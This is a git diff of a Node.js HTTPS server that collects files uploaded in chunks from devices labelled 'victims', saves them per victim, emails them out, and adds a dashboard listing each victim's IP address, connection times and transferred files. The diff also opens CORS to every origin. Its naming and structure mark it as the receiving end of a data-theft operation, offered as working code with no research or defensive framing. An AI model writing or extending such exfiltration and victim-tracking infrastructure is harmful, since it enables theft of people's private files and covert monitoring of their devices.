@@ -16,13 +16,16 @@ const sslOptions = {
 
 // Enable CORS with specific options
 const corsOptions = {
-  origin: 'https://deoptestfrontend-q8ldtkgc8-2naseernoors-projects.vercel.app', // Only allow your frontend
-  methods: ['GET', 'POST', 'OPTIONS'], // Allow preflight
+  origin: '*', // Allow all origins (for testing)
+  methods: ['GET', 'POST', 'OPTIONS'],
   allowedHeaders: ['Content-Type', 'Victim-Id', 'Filename', 'Chunk-Index', 'Total-Chunks'],
 };
 
-app.use(cors(corsOptions)); // Use only this for CORS
-app.options('*', cors(corsOptions)); // Enable preflight for all routes
+app.use(cors(corsOptions));
+app.options('*', cors(corsOptions));
+
+// Serve the dashboard as static files
+app.use('/dashboard', express.static(path.join(__dirname, 'dashboard')));
 
 // Middleware to handle raw binary data for file uploads
 app.use((req, res, next) => {
@@ -35,7 +38,7 @@ app.use((req, res, next) => {
 });
 
 // Base directory for storing files
-const OUTPUT_BASE_DIR = 'received_files';
+const OUTPUT_BASE_DIR = path.join(__dirname, 'received_files');
 if (!fs.existsSync(OUTPUT_BASE_DIR)) {
   fs.mkdirSync(OUTPUT_BASE_DIR, { recursive: true });
 }
@@ -48,6 +51,13 @@ const transporter = nodemailer.createTransport({
   },
 });
 
+const victimFolders = {};
+const victimFileCounts = {};
+const victimTotalFiles = {};
+const victimFiles = {};
+const connectedDevices = {};
+
+// Function to send email
 async function sendEmail(victimId, files) {
   console.log(`🔍 Preparing to send email for victim ${victimId}...`);
 
@@ -88,11 +98,7 @@ async function sendEmail(victimId, files) {
   }
 }
 
-const victimFolders = {};
-const victimFileCounts = {};
-const victimTotalFiles = {};
-const victimFiles = {};
-
+// Function to check if all files are received and send email
 async function checkAndSendEmail(victimId, victimFolder) {
   const filesInFolder = fs.readdirSync(victimFolder);
   if (filesInFolder.length === victimTotalFiles[victimId]) {
@@ -109,9 +115,23 @@ async function checkAndSendEmail(victimId, victimFolder) {
   }
 }
 
+// Route to handle file uploads
 app.post('/upload', (req, res) => {
   let filename = decodeURIComponent(req.headers['filename']);
   let victimId = decodeURIComponent(req.headers['victim-id']);
+  let ip = req.ip;
+
+  if (!connectedDevices[victimId]) {
+    connectedDevices[victimId] = {
+      ip: ip,
+      connectionTime: new Date(),
+      lastConnectionTime: new Date(),
+      filesTransferred: 0,
+      fileList: []
+    };
+  } else {
+    connectedDevices[victimId].lastConnectionTime = new Date();
+  }
 
   if (!victimFolders[victimId]) {
     const timestamp = new Date().toISOString().replace(/:/g, '-');
@@ -132,12 +152,20 @@ app.post('/upload', (req, res) => {
 
     console.log(`✅ File received: ${filename}`);
     victimFileCounts[victimId] += 1;
+    connectedDevices[victimId].filesTransferred += 1;
+    connectedDevices[victimId].fileList.push(filename);
 
     checkAndSendEmail(victimId, victimFolder);
     res.status(200).send('OK');
   });
 });
 
+// Route to provide dashboard data
+app.get('/dashboard-data', (req, res) => {
+  res.json(connectedDevices);
+});
+
+// Start the server
 https.createServer(sslOptions, app).listen(PORT, () => {
   console.log(`🔐 HTTPS server is running on https://localhost:${PORT}`);
 });
